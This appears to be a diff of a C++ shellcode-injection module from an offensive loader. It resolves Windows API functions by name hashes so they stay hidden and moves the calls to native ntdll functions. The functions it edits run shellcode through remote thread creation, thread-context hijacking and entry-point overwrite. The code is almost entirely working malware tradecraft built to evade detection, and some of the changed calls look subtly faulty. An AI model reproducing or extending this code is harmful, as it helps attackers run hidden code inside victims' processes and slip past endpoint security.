@@ -11,30 +11,29 @@ namespace execute {
 		HANDLE thread_handle = INVALID_HANDLE_VALUE;
 		SIZE_T bytes_written = 0;
 		HMODULE kernel32 = NULL;
+		HMODULE ntdll = NULL;
 
-#pragma region [Kernel32 Functions]
+#pragma region Imports
 
 		typeGetLastError GetLastErrorC = NULL;
 		typeVirtualFreeEx VirtualFreeExC = NULL;
 		typeCreateRemoteThread CreateRemoteThreadC = NULL;
-		typeWaitForSingleObject WaitForSingleObjectC = NULL;
+		typeNtWaitForSingleObject NtWaitForSingleObjectC = NULL;
 
 		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
 		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
 		constexpr ULONG hash_createremotethread = malapi::HashStringFowlerNollVoVariant1a("CreateRemoteThread");
-		constexpr ULONG hash_waitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("WaitForSingleObject");
+		constexpr ULONG hash_ntwaitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("NtWaitForSingleObject");
 		constexpr ULONG hash_virtualfreeex = malapi::HashStringFowlerNollVoVariant1a("VirtualFreeEx");
 
 		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
-		if (kernel32 == NULL)
-		{
-			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
-			goto CLEANUP;
-		}
+		ntdll = malapi::GetModuleHandleC(hash_ntdll);
+		if (!kernel32 || !ntdll) goto CLEANUP;
 
 		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
 		CreateRemoteThreadC = (typeCreateRemoteThread)malapi::GetProcAddressC(kernel32, hash_createremotethread);
-		WaitForSingleObjectC = (typeWaitForSingleObject)malapi::GetProcAddressC(kernel32, hash_waitforsingleobject);
+		NtWaitForSingleObjectC = (typeNtWaitForSingleObject)malapi::GetProcAddressC(ntdll, hash_ntwaitforsingleobject);
 		VirtualFreeExC = (typeVirtualFreeEx)malapi::GetProcAddressC(kernel32, hash_virtualfreeex);
 
 #pragma endregion
@@ -48,9 +47,9 @@ namespace execute {
 			goto CLEANUP;
 		}
 		else LOG_SUCCESS("Handle to Thread: 0x%08lX", thread_handle);
-		success = TRUE;
 
-		WaitForSingleObjectC(thread_handle, WAIT_FAILED);
+		NtWaitForSingleObjectC(thread_handle, NULL, NULL);
+		success = TRUE;
 
 	CLEANUP:
 		if (process_handle)
@@ -67,6 +66,7 @@ namespace execute {
 	{
 		BOOL success = FALSE;
 		HMODULE kernel32 = NULL;
+		HMODULE ntdll = NULL;
 		PVOID address_ptr = NULL;
 		DWORD pid = 0;
 		HANDLE proc_snapshot = NULL;
@@ -74,13 +74,13 @@ namespace execute {
 		THREADENTRY32 thread_entry;
 		CONTEXT context;
 
-#pragma region [Kernel32 Functions]
+#pragma region Imports
 
 		typeGetLastError GetLastErrorC = NULL;
 		typeCloseHandle CloseHandleC = NULL;
 		typeVirtualFreeEx VirtualFreeExC = NULL;
 		typeGetProcessId GetProcessIdC = NULL;
-		typeWaitForSingleObject WaitForSingleObjectC = NULL;
+		typeNtWaitForSingleObject NtWaitForSingleObjectC = NULL;
 		typeOpenThread OpenThreadC = NULL;
 		typeThread32First Thread32FirstC = NULL;
 		typeThread32Next Thread32NextC = NULL;
@@ -89,13 +89,18 @@ namespace execute {
 		typeResumeThread ResumeThreadC = NULL;
 		typeGetThreadContext GetThreadContextC = NULL;
 		typeSetThreadContext SetThreadContextC = NULL;
+		typeNtResumeThread NtResumeThreadC = NULL;
+		typeNtClose NtCloseC = NULL;
 
 		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
 		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
 		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");
 		constexpr ULONG hash_virtualfreeex = malapi::HashStringFowlerNollVoVariant1a("VirtualFreeEx");
 		constexpr ULONG hash_getprocessid = malapi::HashStringFowlerNollVoVariant1a("GetProcessId");
-		constexpr ULONG hash_waitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("WaitForSingleObject");
+		constexpr ULONG hash_ntwaitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("NtWaitForSingleObject");
+		constexpr ULONG hash_ntresumethread = malapi::HashStringFowlerNollVoVariant1a("NtResumeThread");
+		constexpr ULONG hash_ntclose = malapi::HashStringFowlerNollVoVariant1a("NtClose");
 
 		constexpr ULONG hash_createtoolhelp32snapshot = malapi::HashStringFowlerNollVoVariant1a("CreateToolhelp32Snapshot");
 		constexpr ULONG hash_thread32first = malapi::HashStringFowlerNollVoVariant1a("Thread32First");
@@ -107,11 +112,8 @@ namespace execute {
 		constexpr ULONG hash_sethreadcontext = malapi::HashStringFowlerNollVoVariant1a("SetThreadContext");
 
 		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
-		if (kernel32 == NULL)
-		{
-			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
-			goto CLEANUP;
-		}
+		ntdll = malapi::GetModuleHandleC(hash_ntdll);
+		if (!kernel32 || !ntdll) goto CLEANUP;
 
 		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
 		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);
@@ -120,12 +122,15 @@ namespace execute {
 		Thread32FirstC = (typeThread32First)malapi::GetProcAddressC(kernel32, hash_thread32first);
 		Thread32NextC = (typeThread32Next)malapi::GetProcAddressC(kernel32, hash_thread32next);
 		GetProcessIdC = (typeGetProcessId)malapi::GetProcAddressC(kernel32, hash_getprocessid);
-		WaitForSingleObjectC = (typeWaitForSingleObject)malapi::GetProcAddressC(kernel32, hash_waitforsingleobject);
 		OpenThreadC = (typeOpenThread)malapi::GetProcAddressC(kernel32, hash_openthread);
 		SuspendThreadC = (typeSuspendThread)malapi::GetProcAddressC(kernel32, hash_suspendthread);
 		ResumeThreadC = (typeResumeThread)malapi::GetProcAddressC(kernel32, hash_resumethread);
 		GetThreadContextC = (typeGetThreadContext)malapi::GetProcAddressC(kernel32, hash_gethreadcontext);
 		SetThreadContextC = (typeSetThreadContext)malapi::GetProcAddressC(kernel32, hash_sethreadcontext);
+
+		NtWaitForSingleObjectC = (typeNtWaitForSingleObject)malapi::GetProcAddressC(ntdll, hash_ntwaitforsingleobject);
+		NtResumeThreadC = (typeNtResumeThread)malapi::GetProcAddressC(ntdll, hash_ntresumethread);
+		NtCloseC = (typeNtClose)malapi::GetProcAddressC(ntdll, hash_ntclose);
 
 #pragma endregion
 
@@ -179,21 +184,12 @@ namespace execute {
 		}
 		LOG_SUCCESS("Set Thread Context.");
 
-		if (ResumeThreadC(thread_handle) == 0)
-		{
-			LOG_ERROR("Thread Failed to be resumed.");
-			goto CLEANUP;
-		}
+		NtResumeThreadC(thread_handle, NULL);
+		NtResumeThreadC(thread_handle, NULL);
+
 		LOG_SUCCESS("Thread Resumed.");
 
-		if (ResumeThreadC(thread_handle) == 0)
-		{
-			LOG_ERROR("Thread Failed to be resumed.");
-			goto CLEANUP;
-		}
-		LOG_SUCCESS("Thread Resumed.");
-
-		WaitForSingleObjectC(thread_handle, WAIT_FAILED);
+		NtWaitForSingleObjectC(thread_handle, NULL, NULL);
 
 		success = TRUE;
 
@@ -208,35 +204,29 @@ namespace execute {
 	BOOL AddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
 	{
 		BOOL success = FALSE;
-		LPCSTR file_path = "C:\\Windows\\System32\\notepad.exe";
-		HANDLE thread_handle = INVALID_HANDLE_VALUE;
-		HMODULE kernel32 = NULL;
+		HMODULE ntdll = NULL;
 
-#pragma region imports
+#pragma region NTDLL_Imports
 
-		typeResumeThread ResumeThreadC = NULL;
-		typeCloseHandle CloseHandleC = NULL;
-		typeGetLastError GetLastErrorC = NULL;
+		typeNtResumeThread NtResumeThreadC = NULL;
+		typeNtClose NtCloseC = NULL;
 
-		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
-		constexpr ULONG hash_resumethread = malapi::HashStringFowlerNollVoVariant1a("ResumeThread");
-		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");
-		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
+		constexpr ULONG hash_ntresumethread = malapi::HashStringFowlerNollVoVariant1a("NtResumeThread");
+		constexpr ULONG hash_ntclose = malapi::HashStringFowlerNollVoVariant1a("NtClose");
+		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
 
-		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
-		ResumeThreadC = (typeResumeThread)malapi::GetProcAddressC(kernel32, hash_resumethread);
-		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);
-		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
+		ntdll = malapi::GetModuleHandleC(hash_ntdll);
+		if (!ntdll) goto CLEANUP;
+		NtResumeThreadC = (typeNtResumeThread)malapi::GetProcAddressC(ntdll, hash_ntresumethread);
+		NtCloseC = (typeNtClose)malapi::GetProcAddressC(ntdll, hash_ntclose);
 
 #pragma endregion
 
-		thread_handle = malapi::EntryPointHandle((LPSTR)file_path, shellcode, shellcode_size);
-		if (thread_handle == NULL) LOG_ERROR("Failed to get handle to thread. (Code: %016llX)", GetLastErrorC());  goto CLEANUP;
-		ResumeThreadC(thread_handle);
+		NtResumeThreadC(process_handle, NULL); // From CONFIG_CREATE_PROCESS 3
 		success = TRUE;
 
 	CLEANUP:
-		CloseHandleC(thread_handle);
+		NtCloseC(process_handle);
 		return success;
 	}
 
